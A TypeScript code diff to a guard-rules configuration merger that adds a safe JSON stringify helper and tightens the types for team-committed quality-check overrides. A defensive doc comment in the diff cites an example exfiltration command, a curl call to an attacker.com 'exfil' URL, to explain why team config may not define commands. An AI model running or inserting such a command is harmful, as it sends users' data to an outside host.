@@ -12,6 +12,17 @@
 import type { GuardRulesConfig, QualityCheckConfig } from "../types.js";
 
 /**
+ * `JSON.stringify`'s lib.d.ts return type is `string`, but that is a lie for
+ * `undefined` / a function / a symbol — it returns `undefined` at runtime for
+ * those. Cast the result back to its honest type so the `?? "undefined"`
+ * fallback below is doing real work, not silencing a redundant condition.
+ */
+function safeJsonStringify(value: unknown): string {
+	const stringified = JSON.stringify(value) as string | undefined;
+	return stringified ?? "undefined";
+}
+
+/**
  * Team config (git-committed) can toggle settings but CANNOT define
  * arbitrary commands. This prevents a malicious PR from adding a quality
  * check with "command": "curl https://attacker.com/exfil" that would
@@ -144,7 +155,7 @@ export function postureEnumViolationsIn(rawStructural: unknown): PostureEnumViol
 		// string (review 2026-08-30 fourth pass: 7 / null / [] / {} were
 		// neither valid nor reported).
 		if (typeof value !== "string" || !allowed.has(value)) {
-			out.push({ field, value: JSON.stringify(value) ?? "undefined" });
+			out.push({ field, value: safeJsonStringify(value) });
 		}
 	}
 	return out;
@@ -348,7 +359,12 @@ export function mergeLocalOverrides(
  */
 function applyTeamQualityCheckOverrides(
 	config: GuardRulesConfig,
-	teamQualityChecks: Record<string, QualityCheckConfig>,
+	// Untyped on purpose: this is raw JSON.parse output from a committed file
+	// (rules-loader.ts reads it with no schema validation), so the caller's
+	// `Record<string, QualityCheckConfig>` field type is aspirational, not
+	// verified — a hand-edited guard-rules.json can put anything here. The
+	// `unknown` below is what makes the shape checks that follow real checks.
+	teamQualityChecks: Record<string, unknown>,
 ): void {
 	for (const [key, teamCheck] of Object.entries(teamQualityChecks)) {
 		const existing = config.quality_checks[key];
@@ -375,8 +391,8 @@ function applyTeamQualityCheckOverrides(
  *  shared shape of the recurring "key added to GuardRulesConfig but never
  *  merged" bug class — see the merge-parity test for the classification. */
 function mergeOptionalSection<K extends keyof GuardRulesConfig>(
-	config: GuardRulesConfig,
-	local: Partial<GuardRulesConfig>,
+	config: Pick<GuardRulesConfig, K>,
+	local: Partial<Pick<GuardRulesConfig, K>>,
 	key: K,
 ): void {
 	const override = local[key];
